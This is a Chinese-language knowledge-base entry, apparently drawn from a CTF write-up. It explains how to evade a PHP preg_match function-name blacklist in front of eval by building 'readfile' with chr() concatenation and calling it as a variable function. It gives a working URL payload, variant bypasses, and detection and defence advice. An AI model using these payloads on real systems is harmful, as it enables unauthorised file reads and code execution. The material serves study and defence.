---
id: web-php-rce-chr-concat-variable-function-blacklist-bypass
title: preg_match 函数黑名单下用 chr() 拼接函数名经 PHP 变量函数调用 readfile 读文件
type: scenario
domain: web
path: web/php/rce
technique: php-variable-function-blacklist-bypass
tags:
- php
- waf-bypass
- blacklist
- readfile
- variable-function
severity: medium
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-33
  verified_at: '2026-11-08T17:02:50+08:00'
  notes: 已对照原文核对：payload与原文逐字一致（chr拼接readfile变量函数调用/tmp/flag.nisp），黑名单与eval逻辑为原文源码；原文无回显截图，writeup文字确认读取成功
url: /docs/web/php/rce/web-php-rce-chr-concat-variable-function-blacklist-bypass/
draft: false
kb_aliases:
- chr 拼接绕过黑名单
- 变量函数绕过 preg_match
---

## 一句话结论

代码用 `preg_match("/system|exec|.../i",$cmd)` 拦函数名但用 eval 执行时，可用 `$_=chr(114).chr(101)...` 拼出 readfile 再以 `$_('/tmp/flag.nisp')` 变量函数调用，绕过黑名单读取任意文件。

## 原理

PHP 的 `$$`/变量函数特性：字符串拼接的结果可作为函数名调用（`$_('x')` 等价于 `readfile('x')`）。黑名单正则匹配的是字面函数名，而 chr(114).chr(101)... 得到的字符串不含任何被拦关键字；配合单字符变量 `$_` 避开对常见变量名的过滤。若题目同时强制 payload 含特定关键字（如 flag），可把关键字放进参数路径（/tmp/flag.nisp）而非函数名，两个条件同时满足。

## 触发条件

- 输入经 preg_match 黑名单过滤后进入 eval/assert 等代码执行点；
- 未禁用 chr、变量函数语法（PHP 默认允许，除非 disable_functions/readfile 被禁或目标字符串函数被过滤）。

## 利用步骤

1. 确定目标函数各字母的 ASCII 码，如 readfile = 114,101,97,100,102,105,108,101；
2. 构造 `$_=chr(114).chr(101).chr(97).chr(100).chr(102).chr(105).chr(108).chr(101);`；
3. 追加 `$_('/tmp/flag.nisp');` 调用，页面输出文件内容（原文场景 flag 在 /tmp/flag.nisp，读 flag.php 无果后试出）。

## PoC

```
?cmd=$_=chr(114).chr(101).chr(97).chr(100).chr(102).chr(105).chr(108).chr(101);$_(%27/tmp/flag.nisp%27);
```

原文实测返回 /tmp/flag.nisp 文件内容（flag）。

## 变体与关联

- 同类绕过：base64_decode 拼函数名、`$GLOBALS` 取已有字符串、call_user_func 回调、"函数名前加反斜杠" 绕过正则锚定；
- 若连 chr/base64_decode 也被拦，可用位运算/自增构造字符串（无字母数字 webshell 思路）。

## 检测与防御

- 检测：payload 中连续 chr( 拼接、单字符变量后紧跟 ( 调用的特征。
- 防御：不用 eval 执行用户输入；disable_functions 收紧；对 `$_=` 这类动态赋值调用加 RASP 拦截。
